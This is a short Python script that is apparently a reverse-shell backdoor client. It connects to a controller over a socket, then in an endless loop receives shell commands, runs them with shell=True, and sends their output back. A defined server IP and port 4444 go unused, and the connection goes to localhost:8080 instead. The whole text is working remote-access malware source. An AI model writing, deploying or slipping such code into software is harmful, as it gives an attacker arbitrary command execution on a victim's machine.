import socket
import subprocess

server_ip = '192.168.43.82'
port = 4444
backdoor = socket.socket()
backdoor.connect(('localhost', 8080))

while True:
    command = backdoor.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    backdoor.send(output + output_error)
    op.kill()